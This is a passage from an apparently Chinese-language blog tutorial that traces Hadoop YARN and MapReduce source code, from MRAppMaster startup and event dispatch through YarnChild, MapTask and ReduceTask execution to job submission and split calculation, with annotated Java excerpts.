class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化一个container</span></span><br><span class="line">    ContainerId containerId = ContainerId.fromString(containerIdStr);</span><br><span class="line">    ApplicationAttemptId applicationAttemptId =</span><br><span class="line">        containerId.getApplicationAttemptId();</span><br><span class="line">    <span class="keyword">if</span> (applicationAttemptId != <span class="keyword">null</span>) &#123;</span><br><span class="line">      CallerContext.setCurrent(<span class="keyword">new</span> CallerContext.Builder(</span><br><span class="line">          <span class="string">"mr_appmaster_"</span> + applicationAttemptId.toString()).build());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> appSubmitTime = Long.parseLong(appSubmitTimeStr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建appMaster对象</span></span><br><span class="line">    MRAppMaster appMaster =</span><br><span class="line">        <span class="keyword">new</span> MRAppMaster(applicationAttemptId, containerId, nodeHostString,</span><br><span class="line">            Integer.parseInt(nodePortString),</span><br><span class="line">            Integer.parseInt(nodeHttpPortString), appSubmitTime);</span><br><span class="line">    ... ...</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 初始化并启动AppMaster</span></span><br><span class="line">    initAndStartAppMaster(appMaster, conf, jobUserName);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">    LOG.error(<span class="string">"Error starting MRAppMaster"</span>, t);</span><br><span class="line">    ExitUtil.terminate(<span class="number">1</span>, t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initAndStartAppMaster</span><span class="params">(<span class="keyword">final</span> MRAppMaster appMaster,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> JobConf conf, String jobUserName)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">    InterruptedException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  conf.getCredentials().addAll(credentials);</span><br><span class="line">  appMasterUgi.doAs(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Object&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">      appMaster.init(conf);</span><br><span class="line">    <span class="comment">// 启动</span></span><br><span class="line">      appMaster.start();</span><br><span class="line">      <span class="keyword">if</span>(appMaster.errorHappenedShutDown) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Was asked to shut down."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">synchronized</span> (stateChangeLock) &#123;</span><br><span class="line">    <span class="keyword">if</span> (enterState(STATE.INITED) != STATE.INITED) &#123;</span><br><span class="line">      setConfig(conf);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 调用MRAppMaster中的serviceInit()方法</span></span><br><span class="line">        serviceInit(config);</span><br><span class="line">        <span class="keyword">if</span> (isInState(STATE.INITED)) &#123;</span><br><span class="line">          <span class="comment">//if the service ended up here during init,</span></span><br><span class="line">          <span class="comment">//notify the listeners</span></span><br><span class="line">      <span class="comment">// 如果初始化完成，通知监听器</span></span><br><span class="line">          notifyListeners();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        noteFailure(e);</span><br><span class="line">        ServiceOperations.stopQuietly(LOG, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">throw</span> ServiceStateException.convert(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找serviceInit实现类，MRAppMaster.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">serviceInit</span><span class="params">(<span class="keyword">final</span> Configuration conf)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// 创建提交路径</span></span><br><span class="line">  clientService = createClientService(context);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建调度器</span></span><br><span class="line">  clientService.init(conf);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建job提交RPC客户端</span></span><br><span class="line">  containerAllocator = createContainerAllocator(clientService, context);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击MRAppMaster.java 中的initAndStartAppMaster 方法中的appMaster.start();</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (isInState(STATE.STARTED)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//enter the started state</span></span><br><span class="line">  <span class="keyword">synchronized</span> (stateChangeLock) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stateModel.enterState(STATE.STARTED) != STATE.STARTED) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        startTime = System.currentTimeMillis();</span><br><span class="line">    <span class="comment">// 调用MRAppMaster中的serviceStart()方法</span></span><br><span class="line">        serviceStart();</span><br><span class="line">        <span class="keyword">if</span> (isInState(STATE.STARTED)) &#123;</span><br><span class="line">          <span class="comment">//if the service started (and isn't now in a later state), notify</span></span><br><span class="line">          LOG.debug(<span class="string">"Service &#123;&#125; is started"</span>, getName());</span><br><span class="line">          notifyListeners();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        noteFailure(e);</span><br><span class="line">        ServiceOperations.stopQuietly(LOG, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">throw</span> ServiceStateException.convert(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">serviceStart</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (initFailed) &#123;</span><br><span class="line">    JobEvent initFailedEvent = <span class="keyword">new</span> JobEvent(job.getID(), JobEventType.JOB_INIT_FAILED);</span><br><span class="line">    jobEventDispatcher.handle(initFailedEvent);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// All components have started, start the job.</span></span><br><span class="line">  <span class="comment">// 初始化成功后，提交Job到队列中</span></span><br><span class="line">    startJobs();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">startJobs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/** create a job-start event to get this ball rolling */</span></span><br><span class="line">  JobEvent startJobEvent = <span class="keyword">new</span> JobStartEvent(job.getID(),</span><br><span class="line">      recoveredJobStartTime);</span><br><span class="line">  <span class="comment">/** send the job-start event. this triggers the job execution. */</span></span><br><span class="line">  <span class="comment">// 这里将job存放到yarn队列</span></span><br><span class="line">  <span class="comment">// dispatcher = AsyncDispatcher</span></span><br><span class="line">  <span class="comment">// getEventHandler()返回的是GenericEventHandler</span></span><br><span class="line">  dispatcher.getEventHandler().handle(startJobEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找handle实现类，GenericEventHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericEventHandler</span> <span class="keyword">implements</span> <span class="title">EventHandler</span>&lt;<span class="title">Event</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(Event event)</span> </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 将job存储到yarn队列中</span></span><br><span class="line">      eventQueue.put(event);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">      ... ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、调度器任务执行（YarnChild）">4、调度器任务执行（YarnChild）</h2><p>查找YarnChild，搜索main方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">  Thread.setDefaultUncaughtExceptionHandler(<span class="keyword">new</span> YarnUncaughtExceptionHandler());</span><br><span class="line">  LOG.debug(<span class="string">"Child starting"</span>);</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  task = myTask.getTask();</span><br><span class="line">  YarnChild.taskid = task.getTaskID();</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create a final reference to the task for the doAs block</span></span><br><span class="line">  <span class="keyword">final</span> Task taskFinal = task;</span><br><span class="line">  childUGI.doAs(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Object&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// use job-specified working directory</span></span><br><span class="line">        setEncryptedSpillKeyIfRequired(taskFinal);</span><br><span class="line">        FileSystem.get(job).setWorkingDirectory(job.getWorkingDirectory());</span><br><span class="line">    <span class="comment">// 调用task执行（maptask或者reducetask）</span></span><br><span class="line">        taskFinal.run(job, umbilical); <span class="comment">// run the task</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; </span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找run实现类，maptask.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">final</span> JobConf job, <span class="keyword">final</span> TaskUmbilicalProtocol umbilical)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.umbilical = umbilical;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断是否是MapTask</span></span><br><span class="line">  <span class="keyword">if</span> (isMapTask()) &#123;</span><br><span class="line">    <span class="comment">// If there are no reducers then there won't be any sort. Hence the map </span></span><br><span class="line">    <span class="comment">// phase will govern the entire attempt's progress.</span></span><br><span class="line">  <span class="comment">// 如果reducetask个数为零，maptask占用整个任务的100%</span></span><br><span class="line">    <span class="keyword">if</span> (conf.getNumReduceTasks() == <span class="number">0</span>) &#123;</span><br><span class="line">      mapPhase = getProgress().addPhase(<span class="string">"map"</span>, <span class="number">1.0f</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// If there are reducers then the entire attempt's progress will be </span></span><br><span class="line">      <span class="comment">// split between the map phase (67%) and the sort phase (33%).</span></span><br><span class="line">    <span class="comment">// 如果reduceTask个数不为零，MapTask占用整个任务的66.7% sort阶段占比</span></span><br><span class="line">      mapPhase = getProgress().addPhase(<span class="string">"map"</span>, <span class="number">0.667f</span>);</span><br><span class="line">      sortPhase  = getProgress().addPhase(<span class="string">"sort"</span>, <span class="number">0.333f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (useNewApi) &#123;</span><br><span class="line">    <span class="comment">// 调用新的API执行maptask</span></span><br><span class="line">    runNewMapper(job, splitMetaInfo, umbilical, reporter);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    runOldMapper(job, splitMetaInfo, umbilical, reporter);</span><br><span class="line">  &#125;</span><br><span class="line">  done(umbilical, reporter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runNewMapper</span><span class="params">(<span class="keyword">final</span> JobConf job,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">final</span> TaskSplitIndex splitIndex,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">final</span> TaskUmbilicalProtocol umbilical,</span></span></span><br><span class="line"><span class="function"><span class="params">                  TaskReporter reporter</span></span></span><br><span class="line"><span class="function"><span class="params">                  )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException,</span></span><br><span class="line"><span class="function">                           InterruptedException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    input.initialize(split, mapperContext);</span><br><span class="line">  <span class="comment">// 运行maptask</span></span><br><span class="line">    mapper.run(mapperContext);</span><br><span class="line">  </span><br><span class="line">    mapPhase.complete();</span><br><span class="line">    setPhase(TaskStatus.Phase.SORT);</span><br><span class="line">    statusUpdate(umbilical);</span><br><span class="line">    input.close();</span><br><span class="line">    input = <span class="keyword">null</span>;</span><br><span class="line">    output.close(mapperContext);</span><br><span class="line">    output = <span class="keyword">null</span>;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    closeQuietly(input);</span><br><span class="line">    closeQuietly(output, mapperContext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Mapper.java（和Map联系在一起）</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">  setup(context);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (context.nextKeyValue()) &#123;</span><br><span class="line">      map(context.getCurrentKey(), context.getCurrentValue(), context);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    cleanup(context);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动ReduceTask,在YarnChild.java类中的main方法中ctrl + alt +B 查找run实现类，reducetask.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(JobConf job, <span class="keyword">final</span> TaskUmbilicalProtocol umbilical)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException </span>&#123;</span><br><span class="line">  job.setBoolean(JobContext.SKIP_RECORDS, isSkipping());</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (useNewApi) &#123;</span><br><span class="line">  <span class="comment">// 调用新API执行reduce</span></span><br><span class="line">    runNewReducer(job, umbilical, reporter, rIter, comparator, </span><br><span class="line">                  keyClass, valueClass);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    runOldReducer(job, umbilical, reporter, rIter, comparator, </span><br><span class="line">                  keyClass, valueClass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  shuffleConsumerPlugin.close();</span><br><span class="line">  done(umbilical, reporter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runNewReducer</span><span class="params">(JobConf job,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">final</span> TaskUmbilicalProtocol umbilical,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">final</span> TaskReporter reporter,</span></span></span><br><span class="line"><span class="function"><span class="params">                   RawKeyValueIterator rIter,</span></span></span><br><span class="line"><span class="function"><span class="params">                   RawComparator&lt;INKEY&gt; comparator,</span></span></span><br><span class="line"><span class="function"><span class="params">                   Class&lt;INKEY&gt; keyClass,</span></span></span><br><span class="line"><span class="function"><span class="params">                   Class&lt;INVALUE&gt; valueClass</span></span></span><br><span class="line"><span class="function"><span class="params">                   )</span> <span class="keyword">throws</span> IOException,InterruptedException, </span></span><br><span class="line"><span class="function">                            ClassNotFoundException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 调用reducetask的run方法</span></span><br><span class="line">    reducer.run(reducerContext);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    trackedRW.close(reducerContext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reduce.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">  setup(context);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (context.nextKey()) &#123;</span><br><span class="line">      reduce(context.getCurrentKey(), context.getValues(), context);</span><br><span class="line">      <span class="comment">// If a back up store is used, reset it</span></span><br><span class="line">      Iterator&lt;VALUEIN&gt; iter = context.getValues().iterator();</span><br><span class="line">      <span class="keyword">if</span>(iter <span class="keyword">instanceof</span> ReduceContext.ValueIterator) &#123;</span><br><span class="line">        ((ReduceContext.ValueIterator&lt;VALUEIN&gt;)iter).resetBackupStore();        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    cleanup(context);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>六、MapReduce源码解析</h1><blockquote><p>之前有介绍</p></blockquote><h2 id="1、Job提交流程源码和切片源码详解">1、Job提交流程源码和切片源码详解</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Job提交流程源码详解</span></span><br><span class="line">waitForCompletion()</span><br><span class="line"></span><br><span class="line">submit();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1建立连接</span></span><br><span class="line">  connect();  </span><br><span class="line">    <span class="comment">// 1）创建提交Job的代理</span></span><br><span class="line">    <span class="keyword">new</span> Cluster(getConfiguration());</span><br><span class="line">      <span class="comment">// （1）判断是本地运行环境还是yarn集群运行环境</span></span><br><span class="line">      initialize(jobTrackAddr, conf); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 提交job</span></span><br><span class="line">submitter.submitJobInternal(Job.<span class="keyword">this</span>, cluster)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1）创建给集群提交数据的Stag路径</span></span><br><span class="line">  Path jobStagingArea = JobSubmissionFiles.getStagingDir(cluster, conf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2）获取jobid ，并创建Job路径</span></span><br><span class="line">  JobID jobId = submitClient.getNewJobID();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3）拷贝jar包到集群</span></span><br><span class="line">copyAndConfigureFiles(job, submitJobDir);  </span><br><span class="line">  rUploader.uploadFiles(job, jobSubmitDir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4）计算切片，生成切片规划文件</span></span><br><span class="line">writeSplits(job, submitJobDir);</span><br><span class="line">    maps = writeNewSplits(job, jobSubmitDir);</span><br><span class="line">    input.getSplits(job);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5）向Stag路径写XML配置文件</span></span><br><span class="line">writeConf(conf, submitJobFile);</span><br><span class="line">  conf.writeXml(out);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 6）提交Job,返回提交状态</span></span><br><span class="line">status = submitClient.submitJob(jobId, submitJobDir.toString(), job.getCredentials());</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251335077.png" alt></p><p>FileInputFormat 切片源码解析（input.getSplits(job)）</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335078.png" alt></p><h2 id="2、MapTask-ReduceTask-源码解析">2、MapTask &amp; ReduceTask 源码解析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MapTask源码解析流程</span></span><br><span class="line">=================== MapTask ===================</span><br><span class="line">context.write(k, NullWritable.get());   <span class="comment">//自定义的map方法的写出，进入</span></span><br><span class="line">  output.write(key, value);  </span><br><span class="line">  <span class="comment">//MapTask727行，收集方法，进入两次 </span></span><br><span class="line">    collector.collect(key, value,partitioner.getPartition(key, value, partitions));</span><br><span class="line">      HashPartitioner(); <span class="comment">//默认分区器</span></span><br><span class="line">    collect()  <span class="comment">//MapTask1082行 map端所有的kv全部写出后会走下面的close方法</span></span><br><span class="line">      close() <span class="comment">//MapTask732行</span></span><br><span class="line">      collector.flush() <span class="comment">// 溢出刷写方法，MapTask735行，提前打个断点，进入</span></span><br><span class="line">        sortAndSpill() <span 